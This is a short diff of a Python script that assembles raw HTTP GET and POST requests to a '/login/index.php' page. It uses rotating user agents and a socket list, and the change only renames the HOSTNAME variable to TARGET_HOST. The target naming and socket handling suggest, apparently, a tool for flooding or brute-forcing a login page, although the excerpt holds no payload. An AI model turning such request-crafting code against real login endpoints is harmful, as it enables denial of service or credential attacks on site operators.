@@ -108,7 +108,7 @@ sockets = []
 
 def get_lm():
     return f"""GET /login/index.php HTTP/1.1\r
-Host: {HOSTNAME}\r
+Host: {TARGET_HOST}\r
 User-Agent: {random.choice(user_agents)}\r
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
 Accept-Language: en-US,en;q=0.5\r
@@ -124,12 +124,12 @@ def post_lm(payload="logintoken=ASxkiwikiwikiwihahaKiwi"):
     contentLength = str(len(payload))
     # print(contentLength); time.sleep(100)
     header = f"""POST /login/index.php HTTP/1.1\r
-Host: {HOSTNAME}\r
+Host: {TARGET_HOST}\r
 User-Agent: {random.choice(user_agents)}\r
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
 Accept-Language: en-US,en;q=0.5\r
 Accept-Encoding: gzip, deflate\r
-Referer: http://{HOSTNAME}/login/index.php\r
+Referer: http://{TARGET_HOST}/login/index.php\r
 Content-Type: application/x-www-form-urlencoded\r
 Content-Length: {contentLength}\r
 Connection: keep-alive\r
